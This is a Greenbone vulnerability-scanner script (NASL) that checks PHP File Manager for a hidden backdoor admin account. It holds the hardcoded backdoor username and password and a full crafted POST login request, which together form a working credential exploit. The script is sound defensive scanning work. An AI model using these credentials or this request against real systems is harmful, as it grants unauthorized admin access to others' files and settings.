# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:revived_wire_media:php_file_manager";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106034");
  script_version("2025-09-05T15:40:40+0000");
  script_tag(name:"last_modification", value:"2025-09-05 15:40:40 +0000 (Fri, 05 Sep 2025)");
  script_tag(name:"creation_date", value:"2015-07-29 10:33:31 +0700 (Wed, 29 Jul 2015)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"Workaround");

  script_name("PHP File Manager Backdoor Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_php_filemanager_detect.nasl");
  script_mandatory_keys("phpfilemanager/installed");

  script_tag(name:"summary", value:"PHP File Manager consists of a default backdoor user.");

  script_tag(name:"vuldetect", value:"Send a crafted POST request and check if log in is possible.");

  script_tag(name:"insight", value:"A default hidden user with admin permissions exists in the db/valid.users
file. This user is not viewable or removable through the web interface.");

  script_tag(name:"impact", value:"An attacker can log in as this hidden user and view and modify files
and settings.");

  script_tag(name:"affected", value:"All versions of PHP File Manager");

  script_tag(name:"solution", value:"No update is currently available. As a workaround remove the user
'****__DO_NOT_REMOVE_THIS_ENTRY__****' from db/valid.users and moreover restrict access to the application.");

  script_xref(name:"URL", value:"http://sijmen.ruwhof.net/weblog/411-multiple-critical-security-vulnerabilities-including-a-backdoor-in-php-file-manager");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php";
req = http_get(item: url, port: port);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: FALSE);
useragent = http_get_user_agent();
cookie = eregmatch(string: res, pattern: "Set-Cookie: (PHPSESSID=[0-9a-z]+);", icase: TRUE);
if (!cookie)
  exit(0);

cookie = cookie[1];
host = http_host_name(port: port);

req = 'POST ' + url + ' HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Accept-Language: en-US,en;q=0.5\r\n' +
      'Cookie: ' + cookie + '\r\n' +
      'Content-Type: multipart/form-data; boundary=---------------------------188983641517810069711679588424\r\n' +
      'Content-Length: 577\r\n\r\n' +
      '-----------------------------188983641517810069711679588424\r\n' +
      'Content-Disposition: form-data; name="input_username"\r\n\r\n' +
      '****__DO_NOT_REMOVE_THIS_ENTRY__****\r\n' +
      '-----------------------------188983641517810069711679588424\r\n' +
      'Content-Disposition: form-data; name="input_password\r\n\r\n' +
      'travan44\r\n' +
      '-----------------------------188983641517810069711679588424\r\n' +
      'Content-Disposition: form-data; name="logsub.x"\r\n\r\n' +
      '48\r\n' +
      '-----------------------------188983641517810069711679588424\r\n' +
      'Content-Disposition: form-data; name="logsub.y"\r\n\r\n' +
      '11\r\n' +
      '-----------------------------188983641517810069711679588424--\r\n';


res = http_keepalive_send_recv(port: port, data: req, bodyonly: FALSE);

if ("/index.php?&amp;action=logout" >< res) {
  security_message(port: port);
  exit(0);
}

exit(0);
